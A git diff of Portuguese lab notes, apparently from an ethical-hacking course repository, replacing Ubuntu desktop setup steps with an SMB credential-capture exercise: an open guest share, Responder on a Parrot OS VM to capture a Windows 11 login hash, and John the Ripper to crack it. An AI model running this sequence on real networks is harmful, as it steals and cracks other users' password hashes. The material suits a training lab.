@@ -4,40 +4,21 @@
 
 - **win11 c5large 65gb**
 - **Parrot OS c5 65gb**
-- **ubuntu24 c5 65gb**
-- **win2016 server base c5 65gb**
 
-### Configuração do Ubuntu
+comando para partilhar pasta
+sudo net usershare add sharefolder /home/parrot/sharefolder "A secret folder shared via SMB" everyone:F guest_ok=y
+executar
+responder -I ens5
 
-#### Passos para Instalar o Ambiente Gráfico:
+no win11 run: \\ip privado do parrot
+tentar meter a pass vai dar erro e aparace o hash no parrot
+![image](https://github.com/pinhers/Ethical-Hacking/assets/145346889/3dfce7ff-cc32-45aa-870b-d50793e12673)
 
-1. **Atualizar os repositórios:**
-    ```bash
-    sudo apt update
-    ```
 
-2. **Instalar XFCE e outros componentes necessários:**
-    ```bash
-    sudo apt install -y xfce4 xfce4-goodies
-    sudo apt install -y xrdp chromium-browser filezilla
-    ```
+parrot-logs:
+/usr/share/responder/logs
+john SMB-xxxxxxxx- TAB
 
-3. **Adicionar usuário xrdp ao grupo ssl-cert:**
-    ```bash
-    sudo adduser xrdp ssl-cert
-    ```
-
-4. **Adicionar novo usuário (maria):**
-    ```bash
-    sudo adduser maria
-    ```
-
-5. **Efetuar login como usuário maria:**
-    ```bash
-    login maria
-    ```
-
-6. **Configurar a sessão do XFCE:**
-    ```bash
-    echo xfce4-session > ~/.xsession
-    ```
+troubleshot:
+sudo lsof -i :445
+sudo systemctl stop smbd
